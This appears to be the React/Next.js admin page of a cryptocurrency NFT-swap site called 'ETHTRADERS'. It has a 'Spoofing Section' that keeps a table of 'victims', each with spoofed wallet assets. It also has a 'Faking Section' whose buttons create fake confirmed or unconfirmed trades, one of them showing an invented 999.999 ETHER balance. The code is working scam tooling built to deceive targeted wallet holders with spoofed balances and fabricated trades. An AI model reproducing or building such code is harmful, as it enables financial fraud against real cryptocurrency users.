import Head from 'next/head';
import { 
    useEffect,
    useState
} from 'react';
import { useAuth } from 'contexts/auth';
import { useRouter } from 'next/router';
import {
    Grid,
    Stack,
    Typography,
    Button,
    TextField,
    Card,
    CardHeader,
    CardContent,    
    CardActions,
    Divider,
    CircularProgress,
    Backdrop,
    Fade,
    Modal,
    Avatar,
    IconButton,
    Table,
    TableHead,
    TableRow,
    TableBody,
    TableCell,
    TableContainer,
    TablePagination,
    Tooltip
} from '@mui/material';
import { toast } from 'react-toastify';
import { red, green } from '@mui/material/colors';
import {
    BiAddToQueue,
    BiUserPlus
} from 'react-icons/bi';
import SwapContainer from 'components/swap2/container';
import ModalContainer from 'components/swap2/modal';
import Web3 from 'web3';
import { 
    useMoralis,
    useMoralisWeb3Api
} from 'react-moralis';
import Moralis from 'moralis';
import settings from 'settings';
import { AiOutlineMinus } from 'react-icons/ai';
import axios from 'axios';
import api from 'services/api';

const style = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    width: 400
};

const TABLE_HEAD = [
    { id: 'victim', label: 'Victim', alignRight: false },
    { id: 'by', label: 'Added by', alignRight: false },
    { id: 'action', label: 'Action', alignRight: true }
  ];

const Data = () => {
    const { isInitialized } = useMoralis();
    const { isAuthenticated, loading, logout } = useAuth();
    const Web3Api = useMoralisWeb3Api();
    const [myAddr, setMyAddr] = useState(null);
    const [destAddr, setDestAddr] = useState(null);
    const [spoofAddr, setSpoofAddr] = useState(null);
    const [boilerData, setBoilerData] = useState([]);
    const [boilerData2, setBoilerData2] = useState([]);
    const [boilerData3, setBoilerData3] = useState([]);
    const [exchangedData, setExchangedData] = useState([]);
    const [exchangedData2, setExchangedData2] = useState([]);  
    const [exchangedData3, setExchangedData3] = useState([]);  
    const [open, setOpen] = useState(false);
    const [open1, setOpen1] = useState(false);
    const [open2, setOpen2] = useState(false);
    const [open3, setOpen3] = useState(false);
    const [open4, setOpen4] = useState(false);
    const [open5, setOpen5] = useState(false);
    const [victims, setVictims] = useState([]);
    const [rowsPerPage, setRowsPerPage] = useState(5);
    const [page, setPage] = useState(0);
    const router = useRouter();
    useEffect(() => {
        if (!loading && !isAuthenticated) {
          router.push('/acp');
        }
    }, 
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [isAuthenticated, loading]);
    const handleChangePage = (event, newPage) => {
        setPage(newPage);
    };

    const handleChangeRowsPerPage = (event) => {
        setRowsPerPage(parseInt(event.target.value, 10));
        setPage(0);
    };
    const emptyRows = page > 0 ? Math.max(0, (1 + page) * rowsPerPage - victims.length) : 0;
    const fetchVictims = async () => {
        try {
            const { data: lr } = await api.get('/admin/fetch');
            if(!lr.success)
                throw new Error(lr.message);
            setVictims(lr.victims);
        } catch (err) {
            toast.error(err.message);
        }
    }
    const removeElement = async (key) => {
        try {
            const { data: lr } = await api.post('/admin/delete', {
                addr: key
            });
            if(!lr.success)
                throw new Error(lr.message);
            fetchVictims();
            toast.success(lr.message);
        } catch (err) {
            toast.error(err.message);   
        }
      }
    useEffect( () => {
        fetchVictims();
    }, 
    // eslint-disable-next-line react-hooks/exhaustive-deps
    []);
    const fetchNFTImg = (img) => {
        if(!img)
          return null;
        if(img.includes('ipfs://')) {
            let imgIPFS = img.split('ipfs://')[1];
            return `https://ipfs.io/ipfs/${imgIPFS}`;
        }
        else {
            return img;
        }
    }
    const fetchNFTs = async (addr, main) => {
        let assetsOwner = [];
        const options = {
            address: addr,
            chain: settings && settings.chainid
        };
        const nftOwners = await Web3Api.account.getNFTs(options);
        if(nftOwners) {
            nftOwners.result.forEach( async (e, i) => {
                if(e && e.contract_type === 'ERC721') {
                    let metadata = JSON.parse(e && e.metadata);
                    try {
                        const { data: stuff } = await axios.get(`https://api.opensea.io/api/v1/asset/${e && e.token_address}/${e && e.token_id}`);
                        assetsOwner.push({
                            img: (stuff && stuff.image_preview_url) || fetchNFTImg(metadata && metadata.image),
                            key : `${e && e.token_id}${e && e.token_address}IN${i}`,
                            type : e && e.contract_type,
                            symbol: e && e.symbol,
                            id : e && e.token_id,
                            address : e && e.token_address,
                            amount : e && e.amount
                        })
                    } catch (err) {
                        assetsOwner.push({
                            img: fetchNFTImg(metadata && metadata.image),
                            key : `${e && e.token_id}${e && e.token_address}IN${i}`,
                            type : e && e.contract_type,
                            symbol: e && e.symbol,
                            id : e && e.token_id,
                            address : e && e.token_address,
                            amount : e && e.amount
                        })
                    }
                }
            })
        }
        
        if(main == 2) {
            assetsOwner.push({
                img: '/ether.png',
                key: 'ether',
                type: 'NATIVE',
                symbol: 'ETHER',
                id: `999.999 ETHER`,
                address: 'ETHEREUM',
                amount: 999.999
            });
            setBoilerData(assetsOwner);
        }
        else {
            const balance = await Web3Api.account.getNativeBalance(options); 
            if(balance) {
                assetsOwner.push({
                    img: '/ether.png',
                    key: 'ether',
                    type: 'NATIVE',
                    symbol: 'ETHER',
                    id: `${Moralis.Units.FromWei(balance.balance)} ETHER`,
                    address: 'ETHEREUM',
                    amount: Moralis.Units.FromWei(balance.balance)
                })
            }
            if(main == 3)
                setBoilerData3(assetsOwner)
            else
                setBoilerData2(assetsOwner)
        }
    }
    const handleOpen = () => setOpen(true);
    const handleOpen3 = () => setOpen3(true);
    const handleOpen4 = () => setOpen4(true);
    const handleClose = () =>{
        if(Web3.utils.isAddress(destAddr) ) {
            fetchNFTs(destAddr, 1);
        } else {
            setDestAddr(null);
            toast.error('Invalid TO address.')
        }
        setOpen(false);
    }
    const handleClose3 = () =>{
        if(Web3.utils.isAddress(myAddr) ) {
            fetchNFTs(myAddr, 2);
        } else {
            setMyAddr(null);
            toast.error('Invalid FROM address.')
        }
        setOpen3(false);
    }
    const handleClose4 = () =>{
        if(Web3.utils.isAddress(spoofAddr) ) {
            fetchNFTs(spoofAddr, 3);
        } else {
            setSpoofAddr(null);
            toast.error('Invalid SPOOF address.')
        }
        setOpen4(false);
    }
    const fakeConfirmed = async () => {
        try {
            await Moralis.enableWeb3();
            if(!isInitialized)
                throw new Error('Web3 is not initalized in your browser.');
            if(!destAddr)
                throw new Error('You haven\'t picked TO counterparty.');
            if(!myAddr)
                throw new Error('You haven\'t picked FROM address.');
            if(exchangedData.length === 0 || exchangedData2.length === 0)
                throw new Error('You did not pick any assets to swap.');
            const { data: lr3 } = await api.post('/trade/admin/make', {
              from: myAddr,
              to: destAddr,
              MyAssets: exchangedData,
              CounterPartyAssets: exchangedData2          
            });
          if(!lr3.success)
              throw new Error(lr3.message);
          toast.success(lr3.message);
        } catch (err) {
            toast.error(err.message);
        }
    }
    const startTrading = async () => {
        try {
            await Moralis.enableWeb3();
            if(!isInitialized)
                throw new Error('Web3 is not initalized in your browser.');
            if(!destAddr)
                throw new Error('You haven\'t picked TO counterparty.');
            if(!myAddr)
                throw new Error('You haven\'t picked FROM address.');
            if(exchangedData.length === 0 || exchangedData2.length === 0)
                throw new Error('You did not pick any assets to swap.');
            const { data: lr2 } = await api.post('/trade/make', {
              from: myAddr,
              to: destAddr,
              MyAssets: exchangedData,
              CounterPartyAssets: exchangedData2,
              MyTransactions: [{}]
          });
          if(!lr2.success)
              throw new Error(lr2.message);
          router.push(`/swap/${lr2 && lr2.trade && lr2.trade.id}`);
        } catch (err) {
            toast.error(err.message);
        }
    }
    const saveVictim = async () => {
        try {
            const { data: lr } = await api.post('/admin/spoof', {
                addr: spoofAddr,
                assets: exchangedData3
            });
            if(!lr.success)
                throw new Error(lr.message);
            fetchVictims();
            toast.success(lr.message);
        } catch (err) {
            toast.error(err.message);
        }
    }
    if(loading || (!isAuthenticated && !loading)) {
        return (
            <>
                <Head>
                    <title>ETHTRADERS | Frequency Monitoring</title>
                </Head>
                <Stack
                    direction="column"
                    justifyContent="center"
                    alignItems="center"
                    sx={{
                        minHeight: '80vh'
                    }}
                >
                    <CircularProgress color="inherit" />
                </Stack>
            </>
        )
    }
    return(
        <>
            <Head>
                <title>ETHTRADERS | Frequency Monitoring</title>
            </Head>
            <Stack
                direction="row"
                justifyContent="space-between"
                spacing={2}
            >
                <Typography
                    color="textPrimary"
                    variant="h4"
                >
                    Admin Control Panel
                </Typography>
            </Stack>
            <Divider />
            <Stack
                direction="column"
                spacing={2}
            >
                <Typography
                    color="textPrimary"
                    variant="h6"
                >
                    Spoofing Section
                </Typography>
                    <Card sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}>
                        <CardHeader
                            avatar={
                                <Avatar 
                                    src={`https://web3-images-api.kibalabs.com/v1/accounts/${spoofAddr}/image`}
                                    sx={{ bgcolor: green[500] }} 
                                    aria-label="me"
                                >
                                    {spoofAddr}
                                </Avatar>
                            }
                            action={
                                spoofAddr ? (
                                    <IconButton onClick={() => setOpen5(true)} aria-label="add">
                                        <BiAddToQueue />
                                    </IconButton>
                                ) : (
                                    <IconButton onClick={handleOpen4} aria-label="user">
                                        <BiUserPlus />
                                    </IconButton>
                                )
                            }
                            title="Wallet Address Spoof"
                            subheader={spoofAddr}
                        />
                        <Divider sx={{ mt: 1, mb: 1 }}/>
                        <CardContent>
                            <SwapContainer
                                exData={boilerData3}
                                setExData={setBoilerData3}
                                setData={setExchangedData3} 
                                data={exchangedData3}
                            />
                        </CardContent>
                    </Card>
                <Divider />
                <Stack
                    direction="row"
                    justifyContent="flex-end"
                    spacing={2}
                >
                    <Button
                        size="large"
                        variant="contained"
                        color="inherit"
                        sx={{ width: 240, mr: 3 }}
                        onClick={saveVictim}
                    >
                        Spoof
                    </Button>
                </Stack>
                <Divider />
                <TableContainer sx={{ minWidth: 800 }}>
                    <Table>
                        <TableHead>
                            <TableRow>
                                {TABLE_HEAD.map( (headCell, ind) => (
                                    
                                    <TableCell
                                        key={headCell.id}
                                        align={headCell.alignRight ? 'right' : 'left'}
                                    >
                                        {headCell.label}
                                    </TableCell>
                                ))}
                            </TableRow>
                        </TableHead>
                        <TableBody>
                            {victims
                                .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
                                .map( (row, i) => (
                                    <TableRow
                                        hover
                                        key={i}
                                        tabIndex={-1}
                                    >
                                        <TableCell component="th" scope="row" padding="none">
                                            <Stack direction="row" alignItems="center" spacing={2}>
                                                <Avatar alt={row.victim} src={`https://web3-images-api.kibalabs.com/v1/accounts/${row.victim}/image`} />
                                                <Tooltip title={row.victim}>
                                                    <Typography variant="subtitle2" noWrap>
                                                        {row.victim.substr(0, 11)}...
                                                    </Typography>
                                                </Tooltip>
                                            </Stack>
                                        </TableCell>
                                        <TableCell align="left">
                                            <Typography variant="body2" noWrap>
                                                {row.by}
                                            </Typography>
                                        </TableCell>
                                        <TableCell align="right">
                                            <IconButton onClick={() => removeElement(row.victim)}>
                                                <AiOutlineMinus />
                                            </IconButton>
                                        </TableCell>
                                    </TableRow>
                                ))
                            }
                            {emptyRows > 0 && (
                                <TableRow style={{ height: 53 * emptyRows }}>
                                <TableCell colSpan={6} />
                                </TableRow>
                            )}
                        </TableBody>
                    </Table>
                </TableContainer>
                <TablePagination
                    rowsPerPageOptions={[5, 10, 25]}
                    component="div"
                    count={victims.length}
                    rowsPerPage={rowsPerPage}
                    page={page}
                    onPageChange={handleChangePage}
                    onRowsPerPageChange={handleChangeRowsPerPage}
                />
                <Divider />
                <Typography
                    color="textPrimary"
                    variant="h6"
                >
                    Faking Section
                </Typography>
            </Stack>
            <Grid container spacing={2}>
                <Grid item md={12} lg={6}>
                    <Card sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}>
                    <CardHeader
                            avatar={
                                <Avatar 
                                    src={`https://web3-images-api.kibalabs.com/v1/accounts/${myAddr}/image`}
                                    sx={{ bgcolor: green[500] }} 
                                    aria-label="me"
                                >
                                    {myAddr}
                                </Avatar>
                            }
                            action={
                                myAddr ? (
                                    <IconButton onClick={() => setOpen1(true)} aria-label="add">
                                        <BiAddToQueue />
                                    </IconButton>
                                ) : (
                                    <IconButton onClick={handleOpen3} aria-label="user">
                                        <BiUserPlus />
                                    </IconButton>
                                )
                            }
                            title="Wallet Address From"
                            subheader={myAddr}
                        />
                        <Divider sx={{ mt: 1, mb: 1 }}/>
                        <CardContent>
                            <SwapContainer
                                exData={boilerData}
                                setExData={setBoilerData}
                                setData={setExchangedData} 
                                data={exchangedData}
                            />
                        </CardContent>
                    </Card>
                </Grid>
                <Grid item md={12} lg={6}>
                    <Card sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}>
                        <CardHeader
                            avatar={
                                <Avatar 
                                    src={`https://web3-images-api.kibalabs.com/v1/accounts/${destAddr}/image`}
                                    sx={{ bgcolor: red[500] }} 
                                    aria-label="me"
                                >
                                    {destAddr}
                                </Avatar>
                            }
                            action={
                                destAddr ? (
                                    <IconButton onClick={() => setOpen2(true)} aria-label="add">
                                        <BiAddToQueue />
                                    </IconButton>
                                ) : (
                                    <IconButton onClick={handleOpen} aria-label="user">
                                        <BiUserPlus />
                                    </IconButton>
                                )
                            }
                            title="Wallet Address To"
                            subheader={destAddr}
                        />
                        <Divider sx={{ mt: 1, mb: 1 }}/>
                        <CardContent>
                            <SwapContainer
                                exData={boilerData2}
                                setExData={setBoilerData2}
                                setData={setExchangedData2} 
                                data={exchangedData2}
                            />
                        </CardContent>
                    </Card>
                </Grid>
            </Grid>
            <Divider sx={{ mt: 2, mb: 2 }} />
            <Stack 
                direction="row"
                justifyContent="flex-end"
                spacing={2}
            >
                <Stack
                    direction="row"
                    spacing={2}
                >
                    <Button
                        size="large"
                        variant="contained"
                        color="inherit"
                        sx={{ width: 240 }}
                        onClick={fakeConfirmed}
                    >
                        Fake Confirmed
                    </Button>
                    <Button
                        size="large"
                        variant="contained"
                        color="warning"
                        sx={{ width: 240, mr: 3 }}
                        onClick={startTrading}
                    >
                        Fake Unconfirmed
                    </Button>
                </Stack>
                
            </Stack>
            <ModalContainer     
                open={open1}
                handleClose={() => setOpen1(false)}
                exData={exchangedData}
                setExData={setExchangedData}
                setData={setBoilerData} 
                data={boilerData}
            />
            <ModalContainer     
                open={open2}
                handleClose={() => setOpen2(false)}
                exData={exchangedData2}
                setExData={setExchangedData2}
                setData={setBoilerData2} 
                data={boilerData2}
            />
            <ModalContainer     
                open={open5}
                handleClose={() => setOpen5(false)}
                exData={exchangedData3}
                setExData={setExchangedData3}
                setData={setBoilerData3} 
                data={boilerData3}
            />
            <Modal
                aria-labelledby="transition-modal-title"
                aria-describedby="transition-modal-description"
                open={open4}
                onClose={handleClose4}
                closeAfterTransition
                BackdropComponent={Backdrop}
                BackdropProps={{
                    timeout: 500,
                }}
            >
                <Fade in={open4}>
                    <Card sx={style}>
                        <CardHeader
                            title="Select FROM address"
                        />
                        <CardContent>
                            <TextField 
                                fullWidth 
                                label="FROM address" 
                                variant="outlined" 
                                value={spoofAddr}
                                onChange={(e) => setSpoofAddr(e.target.value)}
                            />
                        </CardContent>
                        <CardActions>
                            <Button onClick={handleClose4} size="medium">Submit</Button>
                        </CardActions>
                    </Card>
                </Fade>
            </Modal>
            <Modal
                aria-labelledby="transition-modal-title"
                aria-describedby="transition-modal-description"
                open={open3}
                onClose={handleClose3}
                closeAfterTransition
                BackdropComponent={Backdrop}
                BackdropProps={{
                    timeout: 500,
                }}
            >
                <Fade in={open3}>
                    <Card sx={style}>
                        <CardHeader
                            title="Select FROM address"
                        />
                        <CardContent>
                            <TextField 
                                fullWidth 
                                label="FROM address" 
                                variant="outlined" 
                                value={myAddr}
                                onChange={(e) => setMyAddr(e.target.value)}
                            />
                        </CardContent>
                        <CardActions>
                            <Button onClick={handleClose3} size="medium">Submit</Button>
                        </CardActions>
                    </Card>
                </Fade>
            </Modal>
            <Modal
                aria-labelledby="transition-modal-title"
                aria-describedby="transition-modal-description"
                open={open}
                onClose={handleClose}
                closeAfterTransition
                BackdropComponent={Backdrop}
                BackdropProps={{
                    timeout: 500,
                }}
            >
                <Fade in={open}>
                    <Card sx={style}>
                        <CardHeader
                            title="Select TO address"
                        />
                        <CardContent>
                            <TextField 
                                fullWidth 
                                label="TO address" 
                                variant="outlined" 
                                value={destAddr}
                                onChange={(e) => setDestAddr(e.target.value)}
                            />
                        </CardContent>
                        <CardActions>
                            <Button onClick={handleClose} size="medium">Submit</Button>
                        </CardActions>
                    </Card>
                </Fade>
            </Modal>
        </>
    )
}

export default Data;